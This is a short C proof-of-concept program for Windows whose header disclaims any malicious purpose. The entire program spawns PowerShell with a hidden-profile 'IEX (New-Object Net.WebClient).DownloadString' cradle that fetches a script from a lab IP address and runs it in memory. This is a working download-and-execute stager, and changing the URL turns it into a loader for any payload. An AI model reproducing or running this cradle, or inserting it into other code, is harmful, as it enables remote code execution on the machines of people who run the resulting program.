/**
 * Creator:    VPR
 * Created:    February 20th, 2021
 * Updated:    February 20th, 2021
 *
 * Disclaimer:
 *     This program was designed as a proof-of-concept. It doesn't do anything
 *     malicious and it is not intended to do so. Don't try to use it for any
 *     malicious or illegal activity.
**/

#include <windows.h>
#include <stdlib.h>

int main() {

    STARTUPINFOA        si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    int                 rv = 0;

    // Invoke powershell
    rv = CreateProcessA(
        NULL,                                // Path
        (LPSTR)("powershell.exe " // Command line arguments
                "-nop -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.101:8001/writehello.ps1')"),
        NULL,                                // Process handle not inheritable
        NULL,                                // Thread handle not inheritable
        FALSE,                               // Set handle inheritance to FALSE
        0,                                   // CREATE_NEW_CONSOLE, // No creation flags
        NULL,                                // Use parent's environment block
        NULL,                                // Current directory
        &si,                                 // Use parent's starting directory
        &pi                                  // STARTUPINFO pointer
    );
    WaitForSingleObject(pi.hProcess, INFINITE);

    return 0;
}
